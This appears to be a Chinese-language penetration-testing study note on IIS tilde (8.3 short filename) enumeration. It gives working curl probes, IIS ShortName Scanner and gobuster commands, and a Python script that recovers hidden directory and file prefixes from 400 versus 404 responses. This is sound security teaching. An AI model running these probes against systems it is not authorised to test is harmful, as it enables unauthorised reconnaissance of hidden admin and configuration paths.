# 第 35B 章 - IIS 波浪號目錄列舉

## 標籤

- #cpts
- #chapter
- #web
- #enumeration
- #iis
- #tilde

## 學習目標

- 理解 IIS 8.3 短檔名洩露的成因（Tilde Enumeration）。
- 能用 IIS ShortName Scanner 自動化列舉短檔名。
- 掌握從短名推導完整路徑並用 gobuster 驗證的流程。
- 理解這是情報擴張手法，不是直接利用漏洞。

---

## 理論基礎：8.3 短檔名

```text
IIS 為舊式相容性保留了 8.3 短檔名格式：
完整名稱：SecretAdmin.aspx → 短名：SECRET~1.ASP
完整名稱：TransferConfig.asp → 短名：TRANSF~1.ASP

短名結構：[前6字元]~[序號].[3字元副檔名]

攻擊原理：
若對 IIS 送出特定 HTTP 請求並帶入 ~1 這類模式
→ IIS 回應行為差異（404 vs 400）可洩露目錄/檔案是否存在
→ 逐字元猜測 → 還原完整短名 → 推導完整路徑
```

| 特徵 | 說明 |
|------|------|
| 受影響版本 | IIS 早期版本（某些 IIS 7.5/8.x 設定下） |
| 回應差異 | 存在 → 400 Bad Request；不存在 → 404 Not Found |
| 情報價值 | 暴露隱藏目錄名稱前綴、副檔名與命名模式 |

---

## 方法一：確認是否為 IIS

```bash
# nmap 確認 IIS 版本
nmap -sV -p 80,443 TARGET_IP
# 看 Product 欄位是否有 Microsoft IIS

# curl 看 Server header
curl -s -I http://TARGET/ | grep -i "server"
# → Server: Microsoft-IIS/10.0

# whatweb 快速識別
whatweb http://TARGET/
# → IIS[10.0], ASP.NET[...]
```

---

## 方法二：IIS ShortName Scanner 自動化

```bash
# 安裝 IIS ShortName Scanner（Java 工具）
git clone https://github.com/irsdl/IIS-ShortName-Scanner
cd IIS-ShortName-Scanner

# 基本掃描
java -jar iis_shortname_scanner.jar 2 20 http://TARGET/
# 第一個數字 2  → 執行緒數
# 第二個數字 20 → 每次請求最大重試次數
# http://TARGET/ → 目標 URL（根目錄開始）

# 掃特定路徑
java -jar iis_shortname_scanner.jar 2 20 http://TARGET/api/
# 掃 /api/ 子目錄

# 輸出結果範例：
# [*] Testing: http://TARGET/
# [+] Found directory: ADMIN~1     → 有目錄名稱以 ADMIN 開頭
# [+] Found file:      BACKUP~1.ZIP → 有 .zip 檔案名稱以 BACKUP 開頭
# [+] Found file:      CONFIG~1.ASP → 有 .asp 設定檔
```

---

## 方法三：手動驗證（curl 測試行為差異）

```bash
# 測試 IIS Tilde 列舉是否可行
# 原理：存在的短名回 400，不存在回 404

# 測試根目錄是否有以 A 開頭的目錄
curl -s -o /dev/null -w "%{http_code}" \
  "http://TARGET/*~1*/.aspx"
# 404 → 目錄不存在，400 → 有 8.3 模式存在

# 測試特定前綴
curl -s -o /dev/null -w "%{http_code}" \
  "http://TARGET/a*~1*/.aspx"
# 400 → 有目錄以 a 開頭

curl -s -o /dev/null -w "%{http_code}" \
  "http://TARGET/ad*~1*/.aspx"
# → 縮小前綴，逐步確認
```

---

## 方法四：從短名推導完整名稱（gobuster 驗證）

```bash
# 若發現 ADMIN~1 → 推測可能是：
# admin / admin_panel / admin-portal / adminstrator...

# 用 gobuster 掃描以 admin 開頭的路徑
gobuster dir \
  -u http://TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --prefix "admin" \
  -x asp,aspx,html \
  -t 20
# -x asp,aspx,html → 掃這些副檔名（從短名的 .ASP 推測）
# --prefix "admin"  → 只測試以 admin 開頭的詞

# 若知道副檔名（如 CONFIG~1.ASPX 中的 ASPX）
gobuster dir \
  -u http://TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x aspx \
  -t 20
# 結合副檔名線索縮小掃描範圍

# 驗證找到的路徑
curl -s -o /dev/null -w "%{http_code}" http://TARGET/admin/
curl -s -o /dev/null -w "%{http_code}" http://TARGET/admin_panel.aspx
# 200 → 路徑存在且可存取
```

---

## 方法五：用 Python 腳本自動化前綴枚舉

```bash
# 若沒有 Java 工具，可用 Python 腳本手動枚舉
# 概念：逐字元測試每個位置的字元

python3 - << 'EOF'
import requests

target = "http://TARGET/"
charset = "abcdefghijklmnopqrstuvwxyz0123456789-_"
prefix = ""

for _ in range(6):  # 最多6個字元
    for c in charset:
        test = f"{prefix}{c}*~1*/.aspx"
        try:
            r = requests.get(target + test, timeout=3)
            if r.status_code == 400:
                prefix += c
                print(f"[+] Found: {prefix}")
                break
        except:
            pass
    else:
        break

print(f"[*] Final prefix: {prefix}")
EOF
# 這個腳本會逐字元確認前綴
# 最終輸出像 admin 或 config 這樣的前綴
```

---

## Tilde 列舉到完整路徑流程

```
Step 1：確認是 IIS（Server header / nmap）
    ↓
Step 2：IIS ShortName Scanner 掃整站
    → 輸出：ADMIN~1（目錄）/ CONFIG~1.ASP（檔案）
    ↓
Step 3：分析短名
    - 前綴：CONFIG → 完整名可能是 config / configuration / configure
    - 副檔名：ASP → .asp / .aspx
    ↓
Step 4：gobuster 驗證（用前綴 + 副檔名縮小範圍）
    ↓
Step 5：確認找到的路徑是否有價值（管理頁/設定頁/上傳點）
```

---

## 速查表

```bash
# 確認 IIS
curl -I http://TARGET/ | grep -i server

# IIS ShortName Scanner
java -jar iis_shortname_scanner.jar 2 20 http://TARGET/

# 手動確認（短名 vs 404）
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/*~1*/.aspx"
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/a*~1*/.aspx"

# gobuster 驗證短名
gobuster dir -u http://TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x aspx,asp -t 20
```

---

## 關聯筆記

- [[35-Web列舉|第 35 章 - Web 列舉]]
- [[35A-應用程式探索與CMS列舉|第 35A 章 - 應用程式探索與 CMS 列舉]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
